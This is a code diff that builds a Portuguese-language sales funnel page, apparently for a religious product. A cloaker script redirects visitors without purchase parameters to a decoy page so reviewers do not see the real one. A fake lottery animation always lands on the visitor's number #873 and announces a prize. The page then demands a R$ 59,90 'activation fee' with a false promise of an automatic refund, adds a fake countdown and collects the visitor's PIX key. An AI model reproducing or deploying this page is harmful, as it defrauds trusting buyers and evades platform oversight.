@@ -1,4 +1,171 @@
-<script>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processamento de Pedido Seguro</title>
+    
+    <!-- 🛡️ CLOAKER JAVASCRIPT -->
+    <script>
+        (function() {
+            const paginaWhite = "https://noticiasdafe.com.br/aceleradorroteirodivino/"; 
+            const urlParams = new URLSearchParams(window.location.search);
+            const temCompra = urlParams.has('order_id') || urlParams.has('transaction') || urlParams.has('email') || urlParams.has('payment_id');
+            if (!temCompra) {
+                window.location.replace(paginaWhite);
+            }
+        })();
+    </script>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes pulse-slow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+        .animate-pulse-slow { animation: pulse-slow 2s infinite ease-in-out; }
+        .confetti {
+            position: absolute; width: 6px; height: 6px; opacity: 0;
+            animation: fall 2.5s ease-out forwards;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(250px) rotate(360deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans antialiased">
+
+    <!-- 🚨 SEÇÃO DE FINALIZAÇÃO DO PEDIDO (Credibilidade) -->
+    <div class="bg-slate-900 text-white border-b border-slate-700 py-4 px-4 shadow-sm">
+        <div class="max-w-md mx-auto flex items-center space-x-3">
+            <div class="w-2.5 h-2.5 bg-amber-500 rounded-full animate-ping shrink-0"></div>
+            <div class="text-xs md:text-sm">
+                <span class="font-bold text-amber-400 block uppercase">⚙️ Sistema do Roteiro Divino:</span>
+                <span class="text-slate-300">Processando sua compra... Seu acesso principal está sendo enviado para o seu e-mail agora mesmo!</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONTAINER PRINCIPAL -->
+    <main class="max-w-md mx-auto px-4 py-6 space-y-6">
+
+        <!-- ETAPA 1: O PREPARATIVO DO SORTEIO -->
+        <div id="secao-sorteio-inicial" class="bg-white border border-gray-200 rounded-2xl p-5 text-center shadow-md space-y-4">
+            <span class="bg-amber-100 text-amber-800 text-xs font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">
+                Bênção de Boas-Vindas Selecionada
+            </span>
+            <h2 class="text-xl font-extrabold text-gray-900 leading-tight">
+                Você recebeu o Ticket de Identificação de Número <span class="text-blue-600">#873</span>
+            </h2>
+            <p class="text-sm text-gray-600 leading-relaxed">
+                Como agradecimento especial pela sua fé, o sistema executa um sorteio único de 1 a 1000 a cada lote de novos membros. Se a nossa roleta eletrônica parar exatamente no seu número <strong>#873</strong>, você será agraciado com uma liberação de prêmio exclusiva sem custos adicionais.
+            </p>
+            
+            <!-- Visor Inicial Estático -->
+            <div class="bg-gray-950 rounded-xl py-6 my-2 border border-gray-800 shadow-inner relative overflow-hidden">
+                <div id="visor-digitos" class="text-5xl font-mono font-black text-gray-500 tracking-widest flex justify-center space-x-2">
+                    <span id="d1">?</span><span id="d2">?</span><span id="d3">?</span>
+                </div>
+                <div id="confetti-container" class="absolute inset-0 pointer-events-none"></div>
+            </div>
+
+            <!-- Botão de Iniciar -->
+            <button id="btn-iniciar" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-xl shadow transition-all transform active:scale-95 text-sm md:text-base uppercase tracking-wide">
+                🎰 CLIQUE AQUI PARA INICIAR O SORTEIO DE SEGURO
+            </button>
+            <p id="sorteador-status" class="text-xs text-gray-400">Clique para verificar se o seu ticket foi o escolhido de hoje.</p>
+        </div>
+
+        <!-- ETAPA 2: O CONTEÚDO PREMIADO (Revelado dinamicamente após suspense) -->
+        <div id="conteudo-premiado" class="hidden space-y-6">
+            
+            <!-- TIMEOUT DE SEGURANÇA -->
+            <div class="bg-red-50 border border-red-200 rounded-xl p-3.5 text-center shadow-sm">
+                <p class="text-xs text-red-600 font-bold uppercase tracking-wide">O prazo para resgate desta benção expira em:</p>
+                <div class="text-3xl font-mono font-black text-red-600 mt-0.5" id="timer">05:00</div>
+            </div>
+
+            <!-- HEADLINE PRINCIPAL -->
+            <div class="text-center space-y-2">
+                <h1 class="text-2xl md:text-3xl font-black text-gray-900 leading-tight">
+                    🙌 GLÓRIA A DEUS! O SEU NÚMERO <span class="text-emerald-600">#873</span> FOI O VENCEDOR DO SORTEIO!
+                </h1>
+                <p class="text-sm md:text-base text-gray-600 font-medium px-1">
+                    Uma chance em mil! Estatisticamente era quase impossível, mas você foi profundamente abençoado neste exato momento!
+                </p>
+            </div>
+
+            <hr class="border-gray-200">
+
+            <!-- EXPLICAÇÃO E MOTIVO DO SORTEIO -->
+            <div class="space-y-4 text-sm md:text-base leading-relaxed text-gray-700">
+                <h3 class="text-md font-bold text-gray-900 border-l-4 border-emerald-500 pl-2">
+                    Por que você recebeu este prêmio especial?
+                </h3>
+                <p>
+                    O Joseph idealizou este projeto não focado no acúmulo financeiro das grandes corporações, mas sim em agraciar e transformar vidas. Por isso, programamos o sistema para escolher pouquíssimas pessoas para receberem o acesso vitalício ao <strong>Círculo VIP das 12 Palavras + Acelerador 10x</strong> de forma totalmente gratuita, além de providenciar o reembolso integral de <strong>R$ 67,00</strong> da sua primeira aquisição.
+                </p>
+
+                <h3 class="text-md font-bold text-gray-900 border-l-4 border-emerald-500 pl-2">
+                    Procedimento de Segurança para Liberação
+                </h3>
+                <p>
+                    Devido ao alto valor desse prêmio (que custaria mais de R$ 997,00 no mercado formal), o nosso sistema integrado de auditoria exige uma <strong>Verificação de Titularidade e Prevenção de Robôs</strong>.
+                </p>
+                <p>
+                    Para destravar a transação e provar que você é uma pessoa real realizando o resgate, basta efetuar a ativação de segurança por uma taxa temporária de <strong>apenas R$ 59,90</strong>.
+                </p>
+                
+                <!-- Demonstrativo Financeiro -->
+                <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-4 space-y-2">
+                    <p class="font-bold text-emerald-950 text-sm">Logística do Estorno Automático:</p>
+                    <p class="text-xs text-emerald-900 leading-normal">
+                        No exato instante em que o sistema bancário processar sua taxa de ativação de R$ 59,90, a nossa API de pagamentos realiza um **extrato reverso automático** enviado diretamente para o seu CPF.
+                    </p>
+                    <p class="text-xs text-emerald-950 font-bold">Você receberá de volta em sua conta:</p>
+                    <ul class="text-xs text-emerald-900 list-disc pl-4 space-y-0.5">
+                        <li><strong>R$ 59,90</strong> (a taxa de ativação preventiva estornada)</li>
+                        <li><strong>+ R$ 67,00</strong> (o reembolso do seu pagamento anterior)</li>
+                        <li class="text-sm text-emerald-950 font-black mt-1">VALOR TOTAL DO ENVIADO: R$ 126,90</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- FORMULÁRIO DE CHAVE PIX -->
+            <div class="bg-white border border-gray-200 rounded-2xl p-4 shadow-sm space-y-3">
+                <label class="block text-xs font-bold text-gray-700 uppercase tracking-wide">
+                    🔑 Informe sua Chave PIX abaixo para receber o valor de R$ 126,90:
+                </label>
+                <div class="space-y-2">
+                    <select class="w-full bg-gray-50 border border-gray-300 rounded-lg p-2 text-sm focus:outline-none focus:border-emerald-500">
+                        <option value="cpf">CPF (Mesmo titular cadastrado)</option>
+                        <option value="celular">Celular / Telefone</option>
+                        <option value="email">E-mail</option>
+                        <option value="aleatoria">Chave Aleatória (EVP)</option>
+                    </select>
+                    <input type="text" placeholder="Digite sua chave PIX aqui..." class="w-full bg-gray-50 border border-gray-300 rounded-lg p-2 text-sm placeholder-gray-400 focus:outline-none focus:border-emerald-500 font-medium">
+                </div>
+                <p class="text-xxs text-gray-400 text-center">Os dados preenchidos serão validados automaticamente pelo sistema do banco no ato do pagamento.</p>
+            </div>
+
+            <!-- BOTÃO DE AÇÃO -->
+            <div class="pt-1">
+                <a href="https://pay.cakto.com.br/cvmmwjs" class="block w-full bg-emerald-500 hover:bg-emerald-600 text-white text-center font-black text-base py-4 px-6 rounded-xl shadow-md transition-all transform hover:-translate-y-0.5 active:translate-y-0 animate-pulse-slow tracking-wide uppercase">
+                    👉 Concluir Validação e Receber Bênção
+                </a>
+            </div>
+            
+            <p class="text-center text-xxs text-gray-400 max-w-xs mx-auto leading-normal">
+                Processamento fiscal regulamentado e criptografado. Nenhuma cobrança extra posterior será efetuada em sua conta.
+            </p>
+        </div>
+
+    </main>
+
+    <!-- JAVASCRIPT: CONTROLE DO SUSPENSE E CRONÔMETRO -->
+    <script>
         document.addEventListener("DOMContentLoaded", () => {
             const btnIniciar = document.getElementById("btn-iniciar");
             const statusText = document.getElementById("sorteador-status");
@@ -10,57 +177,51 @@
             const d3 = document.getElementById("d3");
 
             btnIniciar.addEventListener("click", () => {
-                // Desativa o botão para evitar cliques duplos
                 btnIniciar.disabled = true;
                 btnIniciar.classList.add("opacity-50", "cursor-not-allowed");
                 btnIniciar.textContent = "Sorteando... Verificando Banco de Dados";
                 statusText.textContent = "Sincronizando lotes numéricos na API...";
 
-                // Controladores para saber se o dígito ainda deve girar
                 let girarD1 = true;
                 let girarD2 = true;
                 let girarD3 = true;
                 
-                // Roda os dígitos de forma aleatória de forma independente
                 const spinner = setInterval(() => {
                     if (girarD1) d1.textContent = Math.floor(Math.random() * 10);
                     if (girarD2) d2.textContent = Math.floor(Math.random() * 10);
                     if (girarD3) d3.textContent = Math.floor(Math.random() * 10);
-                }, 8000 / 100); // Rotação rápida a cada 80ms
+                }, 80);
 
-                // Suspense 1: Para o último dígito no '3' após 2 segundos
+                // Suspense 1: Trava o '3' em 2 segundos
                 setTimeout(() => {
-                    girarD3 = false; // Bloqueia novos números aleatórios para o d3
+                    girarD3 = false;
                     d3.textContent = "3";
-                    d3.classList.add("text-amber-500");
+                    d3.className = "text-amber-500 font-mono font-black";
                     statusText.textContent = "Último dígito verificado... Analisando proximidade...";
                 }, 2000);
 
-                // Suspense 2: Para o dígito do meio no '7' após 3.5 segundos
+                // Suspense 2: Trava o '7' em 3.5 segundos
                 setTimeout(() => {
-                    girarD2 = false; // Bloqueia novos números aleatórios para o d2
+                    girarD2 = false;
                     d2.textContent = "7";
-                    d2.classList.add("text-amber-500");
+                    d2.className = "text-amber-500 font-mono font-black";
                     statusText.textContent = "Padrão de segurança detectado! Aguardando dígito final...";
                 }, 3500);
 
-                // Suspense 3: Finaliza o primeiro dígito no '8' após 5 segundos (Vitória!)
+                // Suspense 3: Trava o '8' em 5 segundos (Vitória!)
                 setTimeout(() => {
-                    clearInterval(spinner); // Desliga totalmente o motor de rotação
+                    clearInterval(spinner);
                     girarD1 = false;
-                    
                     d1.textContent = "8";
                     
-                    // Destaca o número completo vencedor em verde
-                    d1.className = "text-emerald-500 scale-110 transition-transform font-black";
-                    d2.className = "text-emerald-500 scale-110 transition-transform font-black";
-                    d3.className = "text-emerald-500 scale-110 transition-transform font-black";
+                    d1.className = "text-emerald-500 scale-110 transition-transform font-mono font-black";
+                    d2.className = "text-emerald-500 scale-110 transition-transform font-mono font-black";
+                    d3.className = "text-emerald-500 scale-110 transition-transform font-mono font-black";
                     
                     statusText.innerHTML = "🎯 <span class='text-emerald-600 font-bold'>SUCESSO!</span> O lote identificou o seu número!";
                     
                     gerarConfetes();
 
-                    // Revela o restante do funil
                     setTimeout(() => {
                         document.getElementById("secao-sorteio-inicial").classList.add("border-emerald-500", "bg-emerald-50/20");
                         conteudoPremiado.classList.remove("hidden");
@@ -85,6 +246,7 @@
                 }
             }
 
+            // Cronômetro 5 min
             function startTimer(duration, display) {
                 let timer = duration, minutes, seconds;
                 const countdown = setInterval(() => {
@@ -101,3 +263,5 @@
             }
         });
     </script>
+</body>
+</html>
